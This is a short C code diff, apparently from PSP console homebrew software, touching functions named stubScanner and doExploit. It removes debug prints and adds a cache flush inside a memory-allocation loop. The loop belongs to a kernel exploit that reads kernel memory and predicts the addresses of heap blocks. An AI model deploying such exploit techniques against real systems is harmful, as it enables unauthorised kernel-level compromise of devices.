@@ -107,8 +107,6 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
     _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
 
-    PRTSTR1("_sceNpCore_8AFAB4A0: %p", _sceNpCore_8AFAB4A0);
-
     return 0;
 }
 
@@ -124,7 +122,7 @@ int doExploit(void) {
 
     if (_sceNpCore_8AFAB4A0 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
-      PRTSTR1("test_val: %p", test_val);
+      //PRTSTR1("test_val: %p", test_val);
       if (test_val == 0x8F154E38){
         seed = readKram(SYSMEM_SEED_OFFSET_365);
         libc_clock_offset = LIBC_CLOCK_OFFSET_365;
@@ -141,8 +139,10 @@ int doExploit(void) {
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
     SceUID dummyid;
-    for (int i=0; i<10; i++)
+    for (int i=0; i<10; i++){
       dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
+      g_tbl->KernelDcacheWritebackAll();
+    }
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
